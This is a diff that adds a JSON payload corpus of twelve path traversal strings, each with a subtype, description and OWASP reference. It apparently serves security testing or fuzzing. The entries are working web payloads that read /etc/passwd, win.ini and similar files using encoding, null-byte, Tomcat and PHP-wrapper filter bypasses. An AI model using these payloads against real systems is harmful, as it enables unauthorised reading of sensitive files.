@@ -1,0 +1,122 @@
+[
+  {
+    "id": "pt-001",
+    "family": "path_traversal",
+    "subtype": "basic",
+    "payload_string": "../../../etc/passwd",
+    "context": "string",
+    "description": "Basic path traversal to read /etc/passwd",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"linux": true}
+  },
+  {
+    "id": "pt-002",
+    "family": "path_traversal",
+    "subtype": "basic",
+    "payload_string": "..\\..\\..\\windows\\win.ini",
+    "context": "string",
+    "description": "Basic path traversal to read Windows system file",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"windows": true}
+  },
+  {
+    "id": "pt-003",
+    "family": "path_traversal",
+    "subtype": "encoded",
+    "payload_string": "..%2f..%2f..%2fetc%2fpasswd",
+    "context": "string",
+    "description": "URL-encoded path traversal",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"linux": true}
+  },
+  {
+    "id": "pt-004",
+    "family": "path_traversal",
+    "subtype": "double_encoded",
+    "payload_string": "..%252f..%252f..%252fetc%252fpasswd",
+    "context": "string",
+    "description": "Double URL-encoded path traversal",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"linux": true}
+  },
+  {
+    "id": "pt-005",
+    "family": "path_traversal",
+    "subtype": "null_byte",
+    "payload_string": "../../../etc/passwd%00.jpg",
+    "context": "string",
+    "description": "Path traversal with null byte injection to bypass extension check",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"linux": true}
+  },
+  {
+    "id": "pt-006",
+    "family": "path_traversal",
+    "subtype": "unicode",
+    "payload_string": "..\\u002f..\\u002f..\\u002fetc\\u002fpasswd",
+    "context": "string",
+    "description": "Unicode-encoded path traversal",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"linux": true}
+  },
+  {
+    "id": "pt-007",
+    "family": "path_traversal",
+    "subtype": "basic",
+    "payload_string": "....//....//....//etc/passwd",
+    "context": "string",
+    "description": "Path traversal using double dots with double slashes to bypass filter",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"linux": true}
+  },
+  {
+    "id": "pt-008",
+    "family": "path_traversal",
+    "subtype": "basic",
+    "payload_string": "..;/..;/..;/etc/passwd",
+    "context": "string",
+    "description": "Path traversal with semicolon injection for Tomcat bypass",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"tomcat": true}
+  },
+  {
+    "id": "pt-009",
+    "family": "path_traversal",
+    "subtype": "basic",
+    "payload_string": "..%5c..%5c..%5cetc%5cpasswd",
+    "context": "string",
+    "description": "Backslash path traversal with URL encoding",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"windows": true}
+  },
+  {
+    "id": "pt-010",
+    "family": "path_traversal",
+    "subtype": "basic",
+    "payload_string": "....\/....\/....\/etc/passwd",
+    "context": "string",
+    "description": "Path traversal with mixed encoding",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"linux": true}
+  },
+  {
+    "id": "pt-011",
+    "family": "path_traversal",
+    "subtype": "basic",
+    "payload_string": "/etc/passwd",
+    "context": "string",
+    "description": "Absolute path traversal",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"linux": true}
+  },
+  {
+    "id": "pt-012",
+    "family": "path_traversal",
+    "subtype": "basic",
+    "payload_string": "php://filter/convert.base64-encode/resource=/etc/passwd",
+    "context": "string",
+    "description": "PHP filter wrapper for file read via path traversal",
+    "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "platform_specific": {"php": true}
+  }
+]
